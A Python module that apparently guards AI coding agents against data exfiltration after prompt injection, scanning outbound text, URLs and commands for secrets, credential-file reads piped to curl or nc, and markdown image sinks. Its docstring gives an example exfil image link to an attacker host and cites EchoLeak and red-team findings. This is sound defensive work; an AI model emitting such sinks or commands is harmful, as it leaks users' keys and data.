"""Stage 4 — egress / exfiltration guard.

Catches the *damage step* of an injection (cf. EchoLeak, CVE-2025-32711):
secrets or PII leaving the agent, and Markdown/URL sinks used to smuggle data
out — e.g. `![](http://attacker/?data=SECRET)` auto-fetch images, or a Bash
command that reads `~/.ssh/id_rsa` and curls it to an external host.

Offline by default (regex). Microsoft Presidio is used for richer PII detection
only when installed *and* AIRLOCK_EGRESS_PII=1 (it is slow to initialise, so it
stays out of the hot path unless asked for).

On Claude Code these findings drive a PreToolUse gate on outbound tools
(WebFetch/Bash) and a Stop-hook warning on the final reply. On openclaw the same
findings let the adapter rewrite/short-circuit outgoing content (`sanitized_text`).
"""
from __future__ import annotations

import os
import re
from dataclasses import dataclass
from urllib.parse import urlsplit, parse_qsl

# --- secret signatures (high precision, low false-positive) ------------------
_SECRET_PATTERNS = [
    ("aws_access_key", r"\bAKIA[0-9A-Z]{16}\b"),
    ("github_token", r"\bgh[pousr]_[A-Za-z0-9]{36,}\b"),
    ("google_api_key", r"\bAIza[0-9A-Za-z_\-]{35}\b"),
    ("slack_token", r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"),
    ("jwt", r"\beyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\b"),
    ("bearer_token", r"(?i)\bbearer\s+[A-Za-z0-9._\-]{20,}"),
    ("private_key_block", r"-----BEGIN (?:[A-Z0-9 ]+ )?PRIVATE KEY-----"),
    ("secret_assignment",
     r"(?i)\b(api[_-]?key|secret|token|password|passwd|client[_-]?secret|access[_-]?token)\b"
     r"\s*[:=]\s*['\"]?[A-Za-z0-9_\-./+]{16,}"),
    ("us_ssn", r"\b\d{3}-\d{2}-\d{4}\b"),
]
_SECRET_RX = [(label, re.compile(p)) for label, p in _SECRET_PATTERNS]

# sensitive file references + outbound-network indicators (Bash exfil heuristic)
_SENSITIVE_PATH_RX = re.compile(
    r"(?i)(~/?\.ssh|id_rsa|id_ed25519|\.env\b|\.aws/credentials|\.git-credentials|"
    r"\.netrc|secrets?\.(?:json|ya?ml|env)|\.pem\b|private[_-]?key)")
_OUTBOUND_RX = re.compile(r"(?i)\b(curl|wget|nc|ncat|telnet|scp|ftp)\b|/dev/tcp/|https?://")

# markdown / url sinks
_MD_IMAGE_RX = re.compile(r"!\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)>?[^)]*\)")
_MD_LINK_RX = re.compile(r"(?<!\!)\[[^\]]*\]\(\s*<?(https?://[^)\s>]+)>?[^)]*\)")
_MD_REF_DEF_RX = re.compile(r"(?m)^\s*\[[^\]]+\]:\s*<?(https?://\S+?)>?\s*$")
_AUTOLINK_RX = re.compile(r"<(https?://[^>]+)>")
_BARE_URL_RX = re.compile(r"https?://[^\s'\"<>)]+")
# HTML sinks — auto-fetched by most chat/markdown renderers (the EchoLeak surface).
# img/source[/srcset] and CSS url() are image-class (auto-fetch, weight>=2); a/link href is link-class.
_HTML_IMG_RX = re.compile(r"(?i)<(?:img|image|source|iframe|audio|video|embed)\b[^>]*?\b(?:src|srcset)\s*=\s*[\"']?\s*(https?://[^\"'\s>]+)")
_HTML_LINK_RX = re.compile(r"(?i)<(?:a|link)\b[^>]*?\bhref\s*=\s*[\"']?\s*(https?://[^\"'\s>]+)")
_CSS_URL_RX = re.compile(r"(?i)url\(\s*[\"']?\s*(https?://[^\"'\s)]+)")


@dataclass
class EgressFinding:
    kind: str        # secret | pii | exfil_url | markdown_sink | exfil_command
    label: str
    snippet: str
    weight: int      # 1 weak, 2 strong, 3 severe


@dataclass
class EgressVerdict:
    decision: str            # allow | flag | block
    findings: list
    sanitized_text: str      # exfil URLs replaced (for true-strip harnesses)
    severity: int


def _clip(s, n=120):
    s = " ".join(str(s).split())
    return s if len(s) <= n else s[:n - 3] + "..."


def _int_env(name, default):
    try:
        return int(os.environ.get(name, str(default)))
    except ValueError:
        return default


def _allowlist():
    raw = os.environ.get("AIRLOCK_EGRESS_ALLOWLIST", "")
    return {h.strip().lower() for h in raw.split(",") if h.strip()}


def _host_allowed(host, allow):
    host = (host or "").lower()
    return any(host == a or host.endswith("." + a) for a in allow)


def find_secrets(text):
    out = []
    for label, rx in _SECRET_RX:
        m = rx.search(text)
        if m:
            out.append(EgressFinding("secret", label, _clip(m.group(0)), 3))
    return out


def _url_is_exfil(url, allow):
    """Return an EgressFinding if `url` looks like a data-exfiltration sink."""
    try:
        u = urlsplit(url)
    except ValueError:
        return None
    host = u.hostname or ""
    if _host_allowed(host, allow):
        return None
    if find_secrets(url):
        return EgressFinding("exfil_url", "secret_in_url", _clip(url), 3)
    # Query + fragment can both carry exfil (fragment is never sent to the server
    # but IS read by client-side script / trackers, and is a common smuggle spot).
    pairs = parse_qsl(u.query, keep_blank_values=True) + parse_qsl(u.fragment, keep_blank_values=True)
    total = 0
    for _k, v in pairs:
        total += len(v)
        if len(v) >= 24:
            return EgressFinding("exfil_url", "data_param", _clip(url), 1)
    # Split-across-many-params / userinfo / raw fragment evasion: flag on volume too.
    if total >= 40 or len((u.username or "") + (u.password or "")) >= 24 \
            or (u.fragment and "=" not in u.fragment and len(u.fragment) >= 24):
        return EgressFinding("exfil_url", "data_param", _clip(url), 1)
    # base64-ish run in a path segment, tolerating a trailing extension/segment.
    for seg in (u.path or "").split("/"):
        if re.search(r"[A-Za-z0-9+/_\-]{32,}={0,2}", seg):
            return EgressFinding("exfil_url", "data_path", _clip(url), 1)
    return None


def find_markdown_sinks(text, allow):
    findings, sanitized, seen = [], text, set()
    for rx, kind in ((_MD_IMAGE_RX, "image"), (_MD_LINK_RX, "link"),
                     (_MD_REF_DEF_RX, "ref"), (_AUTOLINK_RX, "autolink"),
                     (_HTML_IMG_RX, "image"), (_HTML_LINK_RX, "link"),
                     (_CSS_URL_RX, "image")):
        for m in rx.finditer(text):
            url = m.group(1)
            f = _url_is_exfil(url, allow)
            if f is None:
                continue
            weight = max(f.weight, 2) if kind == "image" else f.weight
            findings.append(EgressFinding("markdown_sink", "%s:%s" % (kind, f.label), _clip(url), weight))
            if url not in seen:
                sanitized = sanitized.replace(url, "[airlock-removed-exfil-url]")
                seen.add(url)
    return findings, sanitized


def find_pii(text):
    """Optional Presidio PII pass (lazy, slow init). Empty if unavailable."""
    try:
        engine = _pii_engine()
    except Exception:
        return []
    if engine is None:
        return []
    try:
        results = engine.analyze(
            text=text, language="en",
            entities=["CREDIT_CARD", "US_SSN", "IBAN_CODE", "EMAIL_ADDRESS",
                      "PHONE_NUMBER", "US_BANK_NUMBER"],
        )
    except Exception:
        return []
    out = []
    for r in results:
        if getattr(r, "score", 0) >= 0.5:
            out.append(EgressFinding("pii", "pii:%s" % r.entity_type,
                                     _clip(text[r.start:r.end]), 2))
    return out


_PII_ENGINE = None
_PII_TRIED = False


def _pii_engine():
    global _PII_ENGINE, _PII_TRIED
    if _PII_TRIED:
        return _PII_ENGINE
    _PII_TRIED = True
    from presidio_analyzer import AnalyzerEngine  # type: ignore
    _PII_ENGINE = AnalyzerEngine()
    return _PII_ENGINE


def _dedupe(findings):
    seen, out = set(), []
    for f in findings:
        key = (f.kind, f.label, f.snippet)
        if key not in seen:
            seen.add(key)
            out.append(f)
    return out


def assess_outbound(text=None, url=None, command=None, pii=None):
    """Assess outbound content for exfiltration. Provide any of text/url/command."""
    allow = _allowlist()
    if pii is None:
        pii = os.environ.get("AIRLOCK_EGRESS_PII", "0").strip().lower() not in ("0", "false", "no", "off", "")
    findings = []
    sanitized = text or ""

    if url:
        f = _url_is_exfil(url, allow)
        if f:
            findings.append(f)
        findings += find_secrets(url)

    if command:
        findings += find_secrets(command)
        if _SENSITIVE_PATH_RX.search(command) and _OUTBOUND_RX.search(command):
            findings.append(EgressFinding("exfil_command", "sensitive_file_exfil", _clip(command), 3))
        for m in _BARE_URL_RX.finditer(command):
            f = _url_is_exfil(m.group(0), allow)
            if f:
                findings.append(f)

    if text:
        findings += find_secrets(text)
        md, sanitized = find_markdown_sinks(text, allow)
        findings += md
        # Sensitive-file read piped to the network, seen anywhere in the body — not
        # only the dedicated `command` channel. Closes openclaw red-team F1/M2 where
        # an exec command nested too deep to surface as `command` still rides in the
        # args JSON. Weight 2 (flag/ask) here vs 3 on the command channel: on a plain
        # reply, path+curl can co-occur benignly, so this asks rather than hard-blocks.
        if _SENSITIVE_PATH_RX.search(text) and _OUTBOUND_RX.search(text):
            findings.append(EgressFinding("exfil_command", "sensitive_file_exfil", _clip(text), 2))
        # Bare URLs in the body (not only markdown/HTML sinks): catches opaque
        # data-param / data-path exfil that a masked or nested tool arg hides from
        # the dedicated `url` channel (openclaw red-team F5). _url_is_exfil only
        # fires on exfil-shaped URLs, so a normal link in a reply isn't flagged.
        # Skip URLs already captured as markdown/HTML sinks above (avoid double-count).
        _md_urls = {f.snippet for f in md}
        for m in _BARE_URL_RX.finditer(text):
            if _clip(m.group(0)) in _md_urls:
                continue
            f = _url_is_exfil(m.group(0), allow)
            if f:
                findings.append(f)
        if pii:
            findings += find_pii(text)

    findings = _dedupe(findings)
    severity = max([f.weight for f in findings], default=0)
    block_threshold = _int_env("AIRLOCK_BLOCK_THRESHOLD", 3)
    if severity >= block_threshold:
        decision = "block"
    elif severity > 0:
        decision = "flag"
    else:
        decision = "allow"
    return EgressVerdict(decision=decision, findings=findings, sanitized_text=sanitized, severity=severity)
